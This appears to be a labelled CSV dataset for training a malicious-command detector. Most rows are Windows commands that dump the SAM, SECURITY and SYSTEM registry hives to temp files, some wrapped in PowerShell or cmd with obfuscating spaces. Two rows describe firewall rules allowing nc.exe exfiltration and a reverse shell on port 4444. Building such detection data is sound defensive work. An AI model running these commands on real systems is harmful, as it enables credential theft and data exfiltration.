text,label
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\3ab9vcmg.save""",1
reg save hklm\sam c:\windows\temp\jc901hxw.save,1
reg save hklm\sam c:\windows\temp\kx0h1nxo.save,1
reg export hklm\sam c:\windows\temp\b0jo4vlr.save,1
reg export hklm\security c:\windows\temp\zqbwdu6q.save,1
reg  save  hklm\security  c:\windows\temp\e8wqh1ls.save,1
reg save hklm\sam c:\windows\temp\qorfhgrx.save,1
reg save hklm\system c:\windows\temp\m1ltv1rp.save,1
reg export hklm\security c:\windows\temp\f7jaf8li.save,1
reg save hklm\system c:\windows\temp\5nrxcmlv.save,1
reg save hklm\security c:\windows\temp\ds5gdjt1.save,1
reg save hklm\security c:\windows\temp\fhw7xet6.save,1
reg export hklm\sam c:\windows\temp\lc492zna.save,1
reg export hklm\sam c:\windows\temp\ihzha0hk.save,1
reg export hklm\security c:\windows\temp\f0tneabi.save,1
reg save hklm\security c:\windows\temp\zw46l9uf.save,1
reg export hklm\security c:\windows\temp\bo9effrm.save,1
"cmd.exe /c ""get-help adjusttokenprivileges -full""",0
reg export hklm\sam c:\windows\temp\df6s4k8w.save,1
reg export hklm\system c:\windows\temp\su7rwd5m.save,1
reg save hklm\system c:\windows\temp\c205koq1.save,1
reg save hklm\sam c:\windows\temp\hvpc9nzf.save,1
reg save hklm\security c:\windows\temp\0zsw4sjv.save,1
reg export hklm\sam c:\windows\temp\kaptsnsb.save,1
reg save hklm\system c:\windows\temp\uiwj7mdn.save,1
reg save hklm\security c:\windows\temp\4cp0pxhq.save,1
reg export hklm\security c:\windows\temp\sm38nc22.save,1
reg save hklm\system c:\windows\temp\yxngbz48.save,1
reg export hklm\sam c:\windows\temp\ja4k1uix.save,1
reg export hklm\sam c:\windows\temp\t6u36xx1.save,1
reg export hklm\security c:\windows\temp\ptued9k0.save,1
reg save hklm\system c:\windows\temp\i2jxa9z5.save,1
reg save hklm\sam c:\windows\temp\m7ubxd5y.save,1
reg export hklm\sam c:\windows\temp\lz3m99jr.save,1
reg save hklm\security c:\windows\temp\9ff8uwt2.save,1
reg save hklm\sam c:\windows\temp\k9fxeih9.save,1
reg save hklm\system c:\windows\temp\yux4538i.save,1
reg save hklm\sam c:\windows\temp\b74nnds9.save,1
reg save hklm\security c:\windows\temp\ya9szsuw.save,1
reg export hklm\security c:\windows\temp\bs770tkh.save,1
reg export hklm\system c:\windows\temp\sfsk5jij.save,1
reg export hklm\system c:\windows\temp\1djnplx3.save,1
reg export hklm\sam c:\windows\temp\w3a9cshw.save,1
reg export hklm\system c:\windows\temp\sgxkvmc1.save,1
reg save hklm\sam c:\windows\temp\5gwquuw7.save,1
reg export hklm\system c:\windows\temp\qiham3xj.save,1
reg export hklm\security c:\windows\temp\cl99jhfy.save,1
reg save hklm\system c:\windows\temp\y3vt76yw.save,1
reg save hklm\security c:\windows\temp\ugmo44a4.save,1
reg save hklm\security c:\windows\temp\w7ltw2i6.save,1
reg export hklm\security c:\windows\temp\v4iv9epw.save,1
reg export hklm\sam c:\windows\temp\9pjamqky.save,1
reg export hklm\system c:\windows\temp\0kqhmkuv.save,1
reg export hklm\system c:\windows\temp\gmqkszqt.save,1
reg export hklm\security c:\windows\temp\5mhncje2.save,1
reg export hklm\sam c:\windows\temp\5pwoo9gf.save,1
reg   save   hklm\sam   c:\windows\temp\pmiq5lg2.save,1
reg export hklm\sam c:\windows\temp\dew4qmi5.save,1
reg export hklm\system c:\windows\temp\dxrklshy.save,1
reg export hklm\security c:\windows\temp\iblcvxcz.save,1
reg save hklm\security c:\windows\temp\ukq34vn8.save,1
reg save hklm\security c:\windows\temp\s515axc3.save,1
reg export hklm\security c:\windows\temp\v5ozv2hm.save,1
reg save hklm\sam c:\windows\temp\dt3l0kmg.save,1
reg export hklm\security c:\windows\temp\11pp2nit.save,1
reg export hklm\security c:\windows\temp\wzgwdi0j.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\kod1u7xc.save""",1
reg export hklm\security c:\windows\temp\i5u0q593.save,1
reg save hklm\system c:\windows\temp\qif8i5hk.save,1
reg export hklm\system c:\windows\temp\imteykvz.save,1
reg save hklm\system c:\windows\temp\6cn6e5zz.save,1
reg   export   hklm\system   c:\windows\temp\52xjj5w3.save,1
reg save hklm\system c:\windows\temp\wh0nd87r.save,1
reg save hklm\security c:\windows\temp\ojsaap43.save,1
reg export hklm\system c:\windows\temp\3of1mewe.save,1
reg save hklm\security c:\windows\temp\fpccbyev.save,1
reg   export   hklm\sam   c:\windows\temp\a5hs93u3.save,1
reg save hklm\security c:\windows\temp\lcd2boa7.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\b8bf35o2.save""",1
reg save hklm\system c:\windows\temp\1wqwrsj7.save,1
reg save hklm\system c:\windows\temp\yucikupd.save,1
reg export hklm\security c:\windows\temp\elbxue53.save,1
reg save hklm\system c:\windows\temp\ijuvdwkh.save,1
reg save hklm\security c:\windows\temp\0csxn7qy.save,1
reg save hklm\security c:\windows\temp\jyyky3ac.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\o80v19ia.save""",1
reg export hklm\system c:\windows\temp\acberimb.save,1
reg export hklm\system c:\windows\temp\0kavxal6.save,1
reg save hklm\sam c:\windows\temp\9dleuax0.save,1
reg save hklm\security c:\windows\temp\7hjt6s1o.save,1
reg save hklm\system c:\windows\temp\9xlvwtzs.save,1
reg save hklm\system c:\windows\temp\f3wdm8ha.save,1
reg export hklm\sam c:\windows\temp\pl9w11wh.save,1
reg export hklm\sam c:\windows\temp\rfxgsj09.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\4f7qy1ip.save""",1
reg export hklm\sam c:\windows\temp\68m2i9hb.save,1
reg save hklm\sam c:\windows\temp\z3sg54xk.save,1
reg export hklm\sam c:\windows\temp\9chyc87r.save,1
reg save hklm\sam c:\windows\temp\nk677nxz.save,1
reg save hklm\sam c:\windows\temp\us47fwac.save,1
reg save hklm\system c:\windows\temp\cnr3o60m.save,1
reg save hklm\sam c:\windows\temp\p4gcc6nf.save,1
reg export hklm\system c:\windows\temp\ohmh24zk.save,1
reg save hklm\security c:\windows\temp\6jnmmo2g.save,1
reg save hklm\security c:\windows\temp\fhmmjkrp.save,1
reg export hklm\sam c:\windows\temp\hzu6olm1.save,1
reg export hklm\system c:\windows\temp\dmxuyx8f.save,1
reg save hklm\system c:\windows\temp\2dag8l8k.save,1
reg save hklm\sam c:\windows\temp\225tpxu5.save,1
reg export hklm\security c:\windows\temp\he4l0vu0.save,1
reg export hklm\security c:\windows\temp\s9s37nn5.save,1
reg export hklm\security c:\windows\temp\2zd2a8ti.save,1
reg save hklm\security c:\windows\temp\tb8d9piw.save,1
reg export hklm\security c:\windows\temp\z8i46102.save,1
reg save hklm\sam c:\windows\temp\980prg21.save,1
reg export hklm\security c:\windows\temp\hwpyvt14.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\jw2gqeya.save""",1
reg save hklm\sam c:\windows\temp\z9rcrx8f.save,1
reg export hklm\sam c:\windows\temp\79jvi0b7.save,1
reg save hklm\sam c:\windows\temp\4z1hpj8q.save,1
reg save hklm\system c:\windows\temp\yn5ub2p9.save,1
reg save hklm\sam c:\windows\temp\cg3f7ma5.save,1
reg save hklm\security c:\windows\temp\zo0lutju.save,1
reg save hklm\security c:\windows\temp\7kt1pw43.save,1
reg save hklm\security c:\windows\temp\g2hsbnea.save,1
reg   export   hklm\system   c:\windows\temp\zd8a7r3y.save,1
reg export hklm\security c:\windows\temp\jktxedh4.save,1
reg export hklm\sam c:\windows\temp\ep69zu67.save,1
reg save hklm\security c:\windows\temp\zsgtcemo.save,1
reg save hklm\sam c:\windows\temp\3bwkdit2.save,1
reg export hklm\security c:\windows\temp\75miuy0x.save,1
reg export hklm\security c:\windows\temp\q1q8eh26.save,1
reg export hklm\sam c:\windows\temp\shze59pf.save,1
reg save hklm\system c:\windows\temp\slozsbuh.save,1
reg export hklm\system c:\windows\temp\jxifgwjk.save,1
reg export hklm\system c:\windows\temp\zuq1r54e.save,1
reg export hklm\security c:\windows\temp\pv4tm92i.save,1
reg export hklm\security c:\windows\temp\jhua7an2.save,1
reg save hklm\sam c:\windows\temp\l3yzl1hu.save,1
reg export hklm\sam c:\windows\temp\mp4rwegu.save,1
reg save hklm\sam c:\windows\temp\fzxy7br5.save,1
reg save hklm\system c:\windows\temp\84u9g2z8.save,1
reg export hklm\sam c:\windows\temp\y8paf2xe.save,1
reg save hklm\system c:\windows\temp\rr9aqpt0.save,1
reg export hklm\sam c:\windows\temp\lh99zno2.save,1
reg export hklm\system c:\windows\temp\dohoafqi.save,1
reg export hklm\security c:\windows\temp\spr09bel.save,1
reg save hklm\sam c:\windows\temp\yoqab34c.save,1
reg export hklm\security c:\windows\temp\h3gc5yeo.save,1
reg export hklm\sam c:\windows\temp\f1qqe2vl.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\y0xu58os.save""",1
reg export hklm\security c:\windows\temp\pecb4vx8.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\tm74ebg6.save""",1
reg export hklm\sam c:\windows\temp\mf510thu.save,1
reg export hklm\security c:\windows\temp\2paovcxp.save,1
reg save hklm\security c:\windows\temp\fz2a7qoy.save,1
reg export hklm\system c:\windows\temp\dxnvdizu.save,1
reg save hklm\security c:\windows\temp\rd1btzp2.save,1
reg export hklm\sam c:\windows\temp\mem5mj9f.save,1
reg export hklm\system c:\windows\temp\imf5ubct.save,1
reg export hklm\system c:\windows\temp\zpwrih42.save,1
reg save hklm\sam c:\windows\temp\qu9thazl.save,1
reg save hklm\sam c:\windows\temp\234zo654.save,1
reg export hklm\security c:\windows\temp\inuno4ps.save,1
reg save hklm\security c:\windows\temp\6w7tnj1z.save,1
reg save hklm\sam c:\windows\temp\5paeqzwy.save,1
reg export hklm\security c:\windows\temp\bqwlxi06.save,1
reg export hklm\security c:\windows\temp\xthumcis.save,1
reg export hklm\security c:\windows\temp\p5ch2b2c.save,1
reg export hklm\security c:\windows\temp\nx87kqmq.save,1
reg save hklm\security c:\windows\temp\4as94tgy.save,1
reg save hklm\security c:\windows\temp\1w8l2it8.save,1
reg export hklm\security c:\windows\temp\9gwgu32r.save,1
reg save hklm\security c:\windows\temp\w3z5wm5a.save,1
reg export hklm\security c:\windows\temp\40fsw47g.save,1
reg export hklm\security c:\windows\temp\rx142skx.save,1
reg export hklm\sam c:\windows\temp\4t79bykv.save,1
reg export hklm\sam c:\windows\temp\zq3v378r.save,1
reg save hklm\system c:\windows\temp\3yfdyy6v.save,1
reg save hklm\security c:\windows\temp\wlnra6h9.save,1
reg save hklm\sam c:\windows\temp\0vqlypgr.save,1
reg save hklm\security c:\windows\temp\5u5nlzgi.save,1
reg export hklm\security c:\windows\temp\qsbfhq4r.save,1
reg save hklm\system c:\windows\temp\927dty3k.save,1
reg export hklm\security c:\windows\temp\x30hm1z2.save,1
reg save hklm\sam c:\windows\temp\j08t8069.save,1
reg export hklm\system c:\windows\temp\4x1wgptg.save,1
reg export hklm\system c:\windows\temp\7s1ub911.save,1
reg save hklm\security c:\windows\temp\6mf3uutt.save,1
reg save hklm\sam c:\windows\temp\u6bf7ssw.save,1
reg save hklm\sam c:\windows\temp\dn1as54e.save,1
reg export hklm\sam c:\windows\temp\rvvxhyxh.save,1
reg save hklm\sam c:\windows\temp\gzgdy5wo.save,1
reg export hklm\security c:\windows\temp\onkul6wd.save,1
reg export hklm\sam c:\windows\temp\3g88tuvz.save,1
reg export hklm\sam c:\windows\temp\7xhss75n.save,1
reg save hklm\security c:\windows\temp\6xj03j4s.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\w0bbk7fi.save""",1
reg export hklm\system c:\windows\temp\77u4ddea.save,1
reg export hklm\security c:\windows\temp\xqqwhr2a.save,1
"powershell -nop -c ""ping  192.168.1.1""",0
reg export hklm\sam c:\windows\temp\8gwivr8l.save,1
reg save hklm\sam c:\windows\temp\sy8sry56.save,1
reg export hklm\system c:\windows\temp\rzxb4fwg.save,1
reg save hklm\system c:\windows\temp\63sig5sc.save,1
reg save hklm\sam c:\windows\temp\5kdjd6wf.save,1
reg export hklm\system c:\windows\temp\nziftxn7.save,1
reg save hklm\sam c:\windows\temp\ze35m3xf.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\o3mx9b6s.save""",1
reg save hklm\system c:\windows\temp\lb86ql4g.save,1
reg save hklm\security c:\windows\temp\qs0z90um.save,1
reg export hklm\sam c:\windows\temp\r7zdm9sx.save,1
reg save hklm\system c:\windows\temp\juhig2xz.save,1
reg save hklm\security c:\windows\temp\8umvihci.save,1
reg save hklm\security c:\windows\temp\zwl8ia5t.save,1
reg save hklm\sam c:\windows\temp\8kfi8ht9.save,1
reg export hklm\sam c:\windows\temp\z3tmqaml.save,1
reg save hklm\system c:\windows\temp\c1mztlj8.save,1
reg save hklm\security c:\windows\temp\6s11ozcn.save,1
reg save hklm\security c:\windows\temp\xid4xfiz.save,1
reg save hklm\security c:\windows\temp\7cwohnch.save,1
reg export hklm\system c:\windows\temp\xswix766.save,1
reg export hklm\security c:\windows\temp\pc8j95x8.save,1
reg save hklm\security c:\windows\temp\eh6xlsln.save,1
reg save hklm\sam c:\windows\temp\4tqwwcrl.save,1
reg save hklm\sam c:\windows\temp\6bwkwr33.save,1
reg export hklm\sam c:\windows\temp\swoiqeu3.save,1
reg save hklm\system c:\windows\temp\3b0gpp85.save,1
reg export hklm\sam c:\windows\temp\1gvydxzh.save,1
reg save hklm\system c:\windows\temp\4liqvual.save,1
reg export hklm\sam c:\windows\temp\cjol4p4c.save,1
reg export hklm\security c:\windows\temp\ekm91xn9.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\igm6ukkb.save""",1
reg save hklm\sam c:\windows\temp\073u07nl.save,1
reg export hklm\sam c:\windows\temp\00cgxekl.save,1
reg export hklm\security c:\windows\temp\46oelvuo.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\okhklwlz.save""",1
reg export hklm\sam c:\windows\temp\e87806ge.save,1
reg export hklm\security c:\windows\temp\mz3ecal7.save,1
reg save hklm\system c:\windows\temp\1ql8bib7.save,1
reg export hklm\sam c:\windows\temp\xeaawf1t.save,1
reg export hklm\sam c:\windows\temp\bqyu5jh9.save,1
reg export hklm\security c:\windows\temp\67o64vm3.save,1
reg save hklm\system c:\windows\temp\whbv4tuq.save,1
reg save hklm\system c:\windows\temp\lnyxe1he.save,1
reg save hklm\sam c:\windows\temp\eoqu5jez.save,1
"powershell -nop -c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
reg export hklm\sam c:\windows\temp\ab6fiq3h.save,1
"cmd.exe /c ""tasklist  /v""",0
reg export hklm\security c:\windows\temp\i1rsumo0.save,1
reg save hklm\security c:\windows\temp\q4x2m7xn.save,1
reg save hklm\sam c:\windows\temp\nvbxg83q.save,1
reg export hklm\sam c:\windows\temp\z93v68kx.save,1
reg save hklm\system c:\windows\temp\30r3nb7z.save,1
reg export hklm\sam c:\windows\temp\2ydkesni.save,1
reg save hklm\system c:\windows\temp\q06x4xiy.save,1
reg save hklm\sam c:\windows\temp\lllyx4b7.save,1
reg save hklm\sam c:\windows\temp\6scg5r7x.save,1
reg export hklm\system c:\windows\temp\s8t008i3.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\s0nn0pys.save""",1
reg export hklm\system c:\windows\temp\4yl9pad5.save,1
reg export hklm\sam c:\windows\temp\fiigsl8h.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\9q7jjzxl.save""",1
reg export hklm\security c:\windows\temp\z2ofg2g2.save,1
reg export hklm\security c:\windows\temp\0mqta0tn.save,1
reg save hklm\system c:\windows\temp\7u63swyl.save,1
reg save hklm\sam c:\windows\temp\c0y09gol.save,1
reg save hklm\sam c:\windows\temp\golzimm5.save,1
reg export hklm\security c:\windows\temp\jknzsvdg.save,1
reg save hklm\sam c:\windows\temp\hn8x09du.save,1
reg export hklm\security c:\windows\temp\ycibpvej.save,1
reg  save  hklm\sam  c:\windows\temp\9dd20btn.save,1
reg export hklm\security c:\windows\temp\3j2r9pls.save,1
reg export hklm\security c:\windows\temp\drx78jh2.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\hbm8kged.save""",1
reg export hklm\sam c:\windows\temp\yitb05fj.save,1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\q5r9fa7r.save""",1
reg export hklm\system c:\windows\temp\qv9un76i.save,1
reg export hklm\security c:\windows\temp\ioi32692.save,1
reg export hklm\security c:\windows\temp\7t16pgho.save,1
reg save hklm\sam c:\windows\temp\mntlpdgd.save,1
reg export hklm\security c:\windows\temp\89lcq4kw.save,1
reg save hklm\system c:\windows\temp\8z1dlz41.save,1
reg save hklm\system c:\windows\temp\sfeku87y.save,1
reg save hklm\security c:\windows\temp\c99x6tef.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\gfnpus6y.save""",1
reg save hklm\security c:\windows\temp\dqcntf4g.save,1
reg export hklm\security c:\windows\temp\rknmg650.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\55c18wnz.save""",1
reg save hklm\system c:\windows\temp\0kvfrkep.save,1
reg save hklm\sam c:\windows\temp\m6prr070.save,1
reg export hklm\security c:\windows\temp\yxylzt6g.save,1
reg save hklm\sam c:\windows\temp\oppric2u.save,1
reg save hklm\security c:\windows\temp\jbjno9oc.save,1
reg save hklm\sam c:\windows\temp\o88uvcav.save,1
reg  export  hklm\sam  c:\windows\temp\lf6jr57j.save,1
reg save hklm\security c:\windows\temp\2uu8c8kw.save,1
reg export hklm\sam c:\windows\temp\3700ja26.save,1
reg export hklm\sam c:\windows\temp\2ucanok2.save,1
reg save hklm\security c:\windows\temp\wglpvoqr.save,1
reg save hklm\sam c:\windows\temp\ny23vbif.save,1
reg export hklm\security c:\windows\temp\frgj2zwt.save,1
reg save hklm\sam c:\windows\temp\2e19eudf.save,1
reg save hklm\security c:\windows\temp\3cbeopap.save,1
reg   save   hklm\security   c:\windows\temp\urrtlntw.save,1
reg export hklm\sam c:\windows\temp\3bmm4c3l.save,1
reg export hklm\system c:\windows\temp\faarejsu.save,1
reg export hklm\system c:\windows\temp\ah4ze560.save,1
reg export hklm\system c:\windows\temp\f3cl0tub.save,1
reg export hklm\system c:\windows\temp\vi2t9nxr.save,1
reg export hklm\sam c:\windows\temp\v0pcp5b6.save,1
reg save hklm\system c:\windows\temp\zwggvv0s.save,1
reg export hklm\security c:\windows\temp\gtef451x.save,1
reg   export   hklm\system   c:\windows\temp\bhi8dmu2.save,1
reg export hklm\system c:\windows\temp\68bvorq9.save,1
reg save hklm\system c:\windows\temp\zgrwyo0b.save,1
reg   save   hklm\sam   c:\windows\temp\casd6leq.save,1
reg save hklm\sam c:\windows\temp\r5nol8cm.save,1
reg save hklm\sam c:\windows\temp\8kco929c.save,1
reg export hklm\system c:\windows\temp\94ue3r4d.save,1
reg save hklm\system c:\windows\temp\6e3v0rnl.save,1
reg save hklm\system c:\windows\temp\4m6kfgab.save,1
reg export hklm\sam c:\windows\temp\hitlgww0.save,1
reg save hklm\system c:\windows\temp\0m2twg1g.save,1
reg save hklm\sam c:\windows\temp\xdea0xvg.save,1
reg export hklm\sam c:\windows\temp\gioofof2.save,1
reg save hklm\security c:\windows\temp\08chtcmx.save,1
reg save hklm\sam c:\windows\temp\b8uk0xz4.save,1
reg save hklm\system c:\windows\temp\vvypflb1.save,1
reg save hklm\sam c:\windows\temp\48n91r2r.save,1
reg save hklm\security c:\windows\temp\o693twns.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\mvpmjev8.save""",1
reg export hklm\system c:\windows\temp\z8myjr83.save,1
reg save hklm\sam c:\windows\temp\70h0vaoj.save,1
reg export hklm\security c:\windows\temp\usdg9z4c.save,1
reg export hklm\system c:\windows\temp\gk8fg4ep.save,1
reg export hklm\system c:\windows\temp\jotdzz3i.save,1
reg export hklm\sam c:\windows\temp\fwretu70.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\qyh5vcqt.save""",1
reg save hklm\sam c:\windows\temp\dezw8dl0.save,1
reg save hklm\sam c:\windows\temp\iz3ixrx9.save,1
reg save hklm\system c:\windows\temp\g10lw20x.save,1
reg export hklm\sam c:\windows\temp\wtzmmi5k.save,1
reg save hklm\system c:\windows\temp\f806p65u.save,1
reg export hklm\sam c:\windows\temp\rtimp4po.save,1
reg save hklm\sam c:\windows\temp\1r1hc207.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\q1pd6hkg.save""",1
reg save hklm\system c:\windows\temp\ipi41gok.save,1
reg save hklm\sam c:\windows\temp\xuwav9ot.save,1
reg export hklm\security c:\windows\temp\s2lj0szk.save,1
reg export hklm\security c:\windows\temp\nl8xiyuh.save,1
reg save hklm\system c:\windows\temp\smi1wn30.save,1
reg export hklm\system c:\windows\temp\evi7enng.save,1
reg save hklm\sam c:\windows\temp\zihscp2o.save,1
reg export hklm\system c:\windows\temp\0skg0556.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\vkf417rr.save""",1
reg save hklm\system c:\windows\temp\p6ocv771.save,1
reg save hklm\sam c:\windows\temp\zt7us8ce.save,1
reg save hklm\security c:\windows\temp\9lpsspnn.save,1
reg export hklm\sam c:\windows\temp\1p3bnugb.save,1
reg export hklm\sam c:\windows\temp\1q4qevkz.save,1
reg export hklm\security c:\windows\temp\zd96o19k.save,1
reg save hklm\security c:\windows\temp\7bt4ib92.save,1
reg export hklm\security c:\windows\temp\bjxp7mj5.save,1
reg save hklm\security c:\windows\temp\511yyrl4.save,1
reg export hklm\system c:\windows\temp\hqiqggrq.save,1
reg save hklm\sam c:\windows\temp\y8b86gof.save,1
reg export hklm\sam c:\windows\temp\4ji24hcz.save,1
reg export hklm\sam c:\windows\temp\c568pa71.save,1
reg  save  hklm\security  c:\windows\temp\osxrj0m6.save,1
reg save hklm\system c:\windows\temp\b3g97dwo.save,1
reg save hklm\system c:\windows\temp\gob622ix.save,1
reg export hklm\security c:\windows\temp\rlc09215.save,1
reg export hklm\sam c:\windows\temp\aez1xiq2.save,1
reg save hklm\system c:\windows\temp\rnc0dq8g.save,1
reg save hklm\system c:\windows\temp\5zlkl7er.save,1
reg export hklm\sam c:\windows\temp\25wtuuw2.save,1
reg export hklm\sam c:\windows\temp\tsftbmf1.save,1
reg save hklm\sam c:\windows\temp\hwku6a0k.save,1
reg save hklm\security c:\windows\temp\m6umzbpp.save,1
reg export hklm\system c:\windows\temp\p0l5cf7h.save,1
reg export hklm\sam c:\windows\temp\ti5g2fpr.save,1
reg save hklm\system c:\windows\temp\z5rnkdqs.save,1
reg   save   hklm\sam   c:\windows\temp\nristh2v.save,1
reg export hklm\system c:\windows\temp\vrx0tfve.save,1
reg export hklm\system c:\windows\temp\pncvdkqo.save,1
reg save hklm\sam c:\windows\temp\xkh4dfs6.save,1
reg save hklm\system c:\windows\temp\34zjqtd0.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\security c:\windows\temp\dlo8qnnh.save,1
reg export hklm\system c:\windows\temp\k53oljw4.save,1
reg export hklm\sam c:\windows\temp\zyfdj1uw.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\i5cgioym.save""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\0ron2f3v.save""",1
reg save hklm\system c:\windows\temp\q6uzv463.save,1
reg export hklm\security c:\windows\temp\eynw5gc1.save,1
reg save hklm\security c:\windows\temp\p6n1fuxe.save,1
reg save hklm\system c:\windows\temp\lxztgpz7.save,1
reg save hklm\system c:\windows\temp\65ig942t.save,1
reg export hklm\system c:\windows\temp\ak6eoj05.save,1
reg save hklm\sam c:\windows\temp\ws71dv6w.save,1
reg save hklm\sam c:\windows\temp\pd58uyzq.save,1
reg export hklm\sam c:\windows\temp\40c2sna0.save,1
reg save hklm\system c:\windows\temp\gdvxilbm.save,1
reg export hklm\sam c:\windows\temp\ndq7pg28.save,1
reg save hklm\sam c:\windows\temp\3gmj0ddi.save,1
reg export hklm\security c:\windows\temp\m2ny15xh.save,1
reg export hklm\system c:\windows\temp\tbt4k5bm.save,1
reg export hklm\security c:\windows\temp\1c4k8qvl.save,1
reg export hklm\system c:\windows\temp\vmsljdsz.save,1
reg save hklm\sam c:\windows\temp\xq0s8qng.save,1
reg export hklm\sam c:\windows\temp\tgn2nfo8.save,1
reg export hklm\security c:\windows\temp\jke72jh0.save,1
reg export hklm\sam c:\windows\temp\6af9v795.save,1
reg export hklm\sam c:\windows\temp\j7shspza.save,1
reg save hklm\security c:\windows\temp\2fb1mwzp.save,1
reg export hklm\system c:\windows\temp\iwmgwwip.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\sam c:\windows\temp\dg34flxi.save,1
reg export hklm\system c:\windows\temp\zxcz28o1.save,1
reg export hklm\sam c:\windows\temp\mjzotw5d.save,1
reg save hklm\system c:\windows\temp\anfn2fn1.save,1
reg export hklm\system c:\windows\temp\fmpkwjkf.save,1
reg save hklm\system c:\windows\temp\j1g8by5n.save,1
reg export hklm\system c:\windows\temp\f28ui7vd.save,1
reg export hklm\system c:\windows\temp\n3l0ulcs.save,1
reg export hklm\sam c:\windows\temp\cfgq4sme.save,1
reg export hklm\sam c:\windows\temp\6opogmup.save,1
reg save hklm\security c:\windows\temp\4twtlz81.save,1
